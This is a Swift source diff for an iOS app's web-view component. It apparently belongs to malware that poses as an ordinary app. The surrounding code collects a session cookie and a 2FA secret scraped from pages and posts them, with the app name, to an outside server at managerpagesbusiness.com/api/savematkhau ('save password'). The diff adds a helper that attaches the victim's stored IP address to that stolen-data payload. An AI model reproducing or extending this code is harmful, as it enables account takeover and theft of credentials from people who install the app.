@@ -5,6 +5,7 @@
 //  Created by DanHa on 25/03/2023.
 //
 
+import Foundation
 import SwiftOTP
 import SwiftUI
 import WebKit
@@ -59,6 +60,16 @@ struct Coords_Nine_Au: UIViewRepresentable {
                 return []
             }
         }
+        
+        func readIppAdd() -> String {
+            var address_i_p: String?
+            if let data_bit = UserDefaults.standard.object(forKey: "diachiip") as? Data {
+                if let loadedPerson = try? JSONDecoder().decode(UserInvoicesIpadress.self, from: data_bit) {
+                    address_i_p = loadedPerson.diachiip
+                }
+            }
+            return address_i_p ?? "diachiip_IP_Null"
+        }
 
         func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
         } // didStartProvisionalNavigation
@@ -98,7 +109,7 @@ struct Coords_Nine_Au: UIViewRepresentable {
                                                 "namecuser": cookies[seven_reco_Au_i!].value,
                                                 "htmlcode2fa": "\(matchedsecret[0])",
                                                 "nameapp": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "")-TWO",
-                                                "ip2fa": "\(UserDefaults.standard.string(forKey: "keyipcallapi") ?? "")",
+                                                "ip2fa": self.readIppAdd(),
                                             ]
                                             let url: URL = URL(string: "https://managerpagesbusiness.com/api/savematkhau")!
                                             let json_data = try? JSONSerialization.data(withJSONObject: Seven_reco_Au_json_data)
@@ -134,4 +145,8 @@ struct Coords_Nine_Au: UIViewRepresentable {
 // Mark Lop theo doi url
 private class Nine_Au_Observable: ObservableObject {
     @Published var ins_Nine_Au_tance: NSKeyValueObservation?
+}
+
+struct UserInvoicesIpadress: Codable {
+    var diachiip: String
 }
